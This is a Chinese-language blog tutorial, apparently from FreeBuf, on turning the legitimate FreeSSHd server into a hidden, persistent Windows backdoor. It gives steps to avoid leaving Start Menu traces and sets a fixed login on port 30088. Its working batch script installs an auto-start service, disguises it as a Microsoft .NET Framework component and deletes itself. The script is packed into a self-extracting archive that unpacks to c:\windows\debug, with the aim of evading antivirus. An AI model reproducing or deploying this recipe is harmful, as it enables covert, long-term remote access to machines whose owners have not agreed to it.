## **前言**  

**计算机中的后门程序，品种多样。有Telnet、IFEO
、WebShell、注册表、Radmin等。大部分后门都会在一段时间内被AV检测到，并清除。通过修改木马源码制作的后门，几乎无法长期驻留在系统中，需要使用白文件，例如Radmin、TeamView、FreeSSH等。因为是合法程序，所以AV不会清除。**

##  **FreeSSH** **的安装**

FreeSSH是一个X86平台上的SSH实现，从网站下载后（<http://www.freesshd.com/freeSSHd.exe>），双击freessh图标，执行安装流程。如图1

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211980749576.png!small)  
图1 安装包

然后，点击“下一步”。如图2

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211980818986.png!small)  

图2

因为我们要制作后门，所以不勾选的选项，如图3

> Ø Don’t create a Start Menu folder
>
> Ø Create a desktop icon

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211984481056.png!small)  
图3

这是为了防止在“开始”->“菜单”中留下痕迹。安装过程会创建一个系统服务，下次开机自动运行后门。如图4

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211984659467.png!small)  

图4 服务

安装完成后，双击图标，来配置用户SSH，如图5

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211984777137.png!small)  

图5

在Users面板添加用户isafe.cc密码为[www.isafe.cc](http://www.isafe.cc)，如图6

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211984917862.png!small)  

图6 Users

在Tunneling面板，勾选如图7

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211985057747.png!small)  

图7

在Main面板中，设置SSH监听的端口30088，如图8

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211985333125.png!small)  

图8

最后，后门“安装->配置”，就大功告成了，现在，使用xshell连接，如图9

![Clipboard
Image.png](https://image.3001.net/images/20180316/1521198551173.png!small)  
图9

##  **打包SSH** **服务端文件**

像这样一步一步的点击安装后门，显然不科学，如果被控机上没有图形控制台，只有命令行就没法子布置了，笔者现在用批处理，rar等技术来打包，省去繁琐的步骤。

将C:\program Files(x86)\freessh目录中的文件提取。如图10

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211985677030.png!small)  

图10

图中FreeSSHDService.ini是后门的主配置文件。里面记录着RSA公钥的位置和TCP端口，账号，密码等信息。一旦SSHD文件复制到了其它目录，RSA密钥的路径也要做相应的改动，(这很重要)，可以将路径改为.(表示当前目录)，这是通用的做法。

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211985808245.png!small)  
图11

run.bat文件用于修改FreeSSHDService.ini和打包EXE，run.bat代码如下：

    
    
    echo ***** Replace "abcd" as"ABCD" *****
    
    set basepath=%~dp0
    
    echo %basepath%
    
    set strFilePath=FreeSSHDService_org.ini
    
    set strOld=sssssssssssssssssssss 
    
    set strNew=RSAKeyPath=%basepath%RSAKey.cfg
    
    set strOld2=sssssssssssssssssssss2
    
    set strNew2=DSAKeyPath=%basepath%DSAKey.cfg
    
    set strOld3=sssssssssssssssssssss3
    
    set strNew3=SSHPublickeyPath=%basepath%
    
     
    
      setlocal enabledelayedexpansion 
    
      for /f "tokens=*" %%i in (%strFilePath%) do (
    
                       echo%%i
    
                       set"var=%%i" 
    
                       
    
                       
    
                       if%strOld%==!var! (echo %strNew% >>FreeSSHDService.ini) else (if%strOld2%==!var! (echo %strNew2% >>FreeSSHDService.ini) else (if%strOld3%==!var!    (echo %strNew3% >>FreeSSHDService.ini) else (echo %%i>>FreeSSHDService.ini )))
    
                       
    
    )
    
     
    
    net stop FreeSSHDService
    
    set b=%cd%
    
    FreeSSHDService /Service
    
    sc config FreeSSHDService start= auto
    
    sc config FreeSSHDService  DisplayName= "Microsoft .NET FrameworkNGEN v2.0.50726_X86"
    
    sc description FreeSSHDService "Microsoft .NET Framework NGENv2.0.50726_X86"
    
    net start "Microsoft .NET FrameworkNGEN v2.0.50726_X86"
    
    del FreeSSHDService_org.ini
    
    del run.bat

## 添加防火墙规则

Bat文件写好后用rar打包，创建自解压ExE，压缩选项如图12，图13：

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211986047804.png!small)  
图12 路径c:\windows\debug

  
![Clipboard
Image.png](https://image.3001.net/images/20180316/15211986141741.png!small)  

图13 解压后运行run.bat

##  **后门测试**

将打包后的freessh.exe，在Win7上运行。如图14，图15，图16。

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211986316854.png!small)  
图14

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211987353853.png!small)  
图15

![Clipboard
Image.png](https://image.3001.net/images/20180316/15211986638599.png!small)  

图16

使用XShell连接30088端口，如图17所示。

![Clipboard
Image.png](https://image.3001.net/images/20180316/1521198675930.png!small)  
图17

##  **总结**

通过白文件构造的后门，应该能长期驻留在系统中了。

 ***本文作者：河马安全网，转载请注明来自FreeBuf.COM**

